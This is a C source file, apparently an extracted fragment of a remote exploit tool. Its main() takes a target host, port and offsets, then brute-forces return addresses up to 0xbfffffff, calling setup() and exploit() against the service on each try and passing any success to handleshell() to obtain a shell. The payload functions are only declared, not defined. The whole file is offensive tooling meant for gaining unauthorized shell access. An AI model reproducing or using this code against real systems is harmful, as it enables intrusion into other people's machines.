
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_long ;
struct TYPE_2__ {char* h; scalar_t__ null_offset; int brutebase; int nullbrute; int allign; int checkvuln; int shell; void* p; void* module; } ;


 void* ALLIGN ;
 int BRUTEBASE ;
 scalar_t__ ENDNULLBRUTE ;
 char EOF ;
 scalar_t__ INCREMENT ;
 scalar_t__ NULL_OFFSET ;
 void* PORT ;
 scalar_t__ STARTNULLBRUTE ;
 void* atoi (void*) ;
 int exit (int) ;
 scalar_t__ exploit (int) ;
 int fprintf (int ,char*,...) ;
 char getopt (int,char**,char*) ;
 int handleshell (int,int ) ;
 int open_s (char*,void*) ;
 void* optarg ;
 TYPE_1__ rsx ;
 scalar_t__ setup (int) ;
 int stderr ;
 int strlen (void*) ;
 int strtoul (void*,char**,int) ;
 int usage (char*) ;

int
main(int argc, char **argv)
{
 char c;
 int s;
 u_long store;

 if(argc == 1) usage(argv[0]);

 rsx.h = "localhost";
 rsx.p = PORT;
 rsx.null_offset = NULL_OFFSET;
 rsx.brutebase = BRUTEBASE;
 rsx.nullbrute = 0;
 rsx.allign = ALLIGN;


 while((c = getopt(argc, argv, "h:p:m:o:b:Ba:")) != EOF) {
  switch(c) {
   case 'h':
    rsx.h = optarg;
    break;
   case 'p':
    rsx.p = atoi(optarg);
    break;
   case 'm':
    rsx.module = optarg;
    break;
   case 'o':
    rsx.null_offset = atoi(optarg);
    break;
   case 'b':
    rsx.brutebase = strtoul(optarg, (char **)optarg+strlen(optarg), 16);
    break;
   case 'B':
    rsx.nullbrute = 1;
    break;
   case 'a':
    rsx.allign = atoi(optarg);
    if(rsx.allign>4) {
     fprintf(stderr, "allign > 4 !? using default\n");
     rsx.allign = ALLIGN;
    }
    break;
   default:
    usage(argv[0]);
  }
 }



 store = rsx.brutebase;

 if(rsx.nullbrute)
  for(rsx.null_offset = STARTNULLBRUTE; rsx.null_offset >= ENDNULLBRUTE; rsx.null_offset--)
{
   fprintf(stderr, "\noffset: %d\n", rsx.null_offset);

   for(rsx.checkvuln = 1; rsx.brutebase <= 0xbfffffff; rsx.brutebase += INCREMENT) {
    if((s = open_s(rsx.h, rsx.p)) < 0) {
     fprintf(stderr, "poop..bye\n");
     exit(1);
    }

    if(setup(s) > 0)
     if(exploit(s) > 0)
      handleshell(s, rsx.shell);
   }
   rsx.brutebase = store;
  }


  for(rsx.checkvuln = 1; rsx.brutebase <= 0xbfffffff; rsx.brutebase += INCREMENT) {
                if((s = open_s(rsx.h, rsx.p)) < 0) {
                        fprintf(stderr, "poop..bye\n");
                        exit(1);
                }

                if(setup(s) > 0)
                        if(exploit(s) > 0)
                                handleshell(s, rsx.shell);
        }


 fprintf(stderr, "No luck...bye\n");
 exit(0);
}
